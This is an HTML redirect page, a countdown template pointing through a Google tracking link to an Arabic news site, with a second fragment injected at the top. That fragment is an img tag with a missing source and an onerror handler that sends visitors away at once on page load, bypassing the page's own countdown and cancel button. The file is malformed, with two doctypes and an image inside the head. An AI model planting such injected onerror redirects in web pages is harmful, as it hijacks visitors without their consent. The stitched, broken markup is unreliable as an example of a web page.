<!DOCTYPE html>
<html lang="en">
<head>

<img src='/static/images/d4fdf41d5g.png' onerror=window.location="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.akhbarlite.com/29608-%25D8%25B7%25D8%25B1%25D9%2582-%25D9%2585%25D8%25B4%25D8%25A7%25D9%2587%25D8%25AF%25D8%25A9-%25D8%25A7%25D9%2584%25D8%25A8%25D8%25AB-%25D8%25A7%25D9%2584%25D9%2585%25D8%25A8%25D8%25A7%25D8%25B4%25D8%25B1-%25D9%2584%25D9%2585%25D8%25A8%25D8%25A7%25D8%25B1%25D8%25A7%25D8%25A9-%25D9%2584%25D9%258A%25D9%2581%25D8%25B1%25D8%25A8/&ved=2ahUKEwjFo4Xkko2PAxUaTaQEHT6XAhsQr_oDKAB6BAgSEAE&usg=AOvVaw1JC8llkk1q7VjahyU7gZOL"><!DOCTYPE html>
<html lang="en">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 60px 40px;
            max-width: 600px;
            width: 100%;
            text-align: center;
        }

        .icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: rotate 2s linear infinite;
        }

        @keyframes rotate {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        h1 {
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 20px;
        }

        .message {
            color: #666;
            font-size: 1.2em;
            margin-bottom: 30px;
        }

        .countdown {
            font-size: 3em;
            color: #764ba2;
            font-weight: bold;
            margin: 30px 0;
        }

        .url-display {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            word-break: break-all;
            color: #333;
        }

        .button-group {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
            margin-top: 30px;
        }

        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 35px;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            font-weight: bold;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        button:active {
            transform: translateY(0);
        }

        .cancel-btn {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e0e0e0;
            border-radius: 10px;
            overflow: hidden;
            margin-top: 20px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            transition: width 1s linear;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">ðŸ”„</div>
        <h1>Redirecting...</h1>
        <p class="message">You will be redirected in:</p>
        <div class="countdown" id="countdown">5</div>
        
        <div class="url-display">
            <strong>Destination:</strong><br>
            <span id="targetUrl">https://www.example.com</span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progress"></div>
        </div>

        <div class="button-group">
            <button onclick="redirectNow()">Go Now</button>
            <button class="cancel-btn" onclick="cancelRedirect()">Cancel</button>
        </div>
    </div>

    <script>
        // Change this URL to your desired redirect destination
        const redirectUrl = 'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.akhbarlite.com/29608-%25D8%25B7%25D8%25B1%25D9%2582-%25D9%2585%25D8%25B4%25D8%25A7%25D9%2587%25D8%25AF%25D8%25A9-%25D8%25A7%25D9%2584%25D8%25A8%25D8%25AB-%25D8%25A7%25D9%2584%25D9%2585%25D8%25A8%25D8%25A7%25D8%25B4%25D8%25B1-%25D9%2584%25D9%2585%25D8%25A8%25D8%25A7%25D8%25B1%25D8%25A7%25D8%25A9-%25D9%2584%25D9%258A%25D9%2581%25D8%25B1%25D8%25A8/&ved=2ahUKEwjFo4Xkko2PAxUaTaQEHT6XAhsQr_oDKAB6BAgSEAE&usg=AOvVaw1JC8llkk1q7VjahyU7gZOL';
        
        // Change this to set the countdown duration (in seconds)
        const countdownTime = 5;
        
        let timeLeft = countdownTime;
        let countdownInterval;
        let cancelled = false;

        // Display the target URL
        document.getElementById('targetUrl').textContent = redirectUrl;

        function updateCountdown() {
            if (cancelled) return;
            
            document.getElementById('countdown').textContent = timeLeft;
            
            // Update progress bar
            const progress = ((countdownTime - timeLeft) / countdownTime) * 100;
            document.getElementById('progress').style.width = progress + '%';
            
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
                redirect();
            } else {
                timeLeft--;
            }
        }

        function redirect() {
            if (!cancelled) {
                window.location.href = redirectUrl;
            }
        }

        function redirectNow() {
            cancelled = false;
            clearInterval(countdownInterval);
            redirect();
        }

        function cancelRedirect() {
            cancelled = true;
            clearInterval(countdownInterval);
            document.getElementById('countdown').textContent = 'âœ•';
            document.querySelector('.message').textContent = 'Redirect cancelled';
            document.querySelector('.icon').textContent = 'âœ“';
            document.querySelector('.icon').style.animation = 'none';
            document.getElementById('progress').style.width = '0%';
        }

        // Start the countdown
        countdownInterval = setInterval(updateCountdown, 1000);
        updateCountdown();
    </script>
</body>
</html>
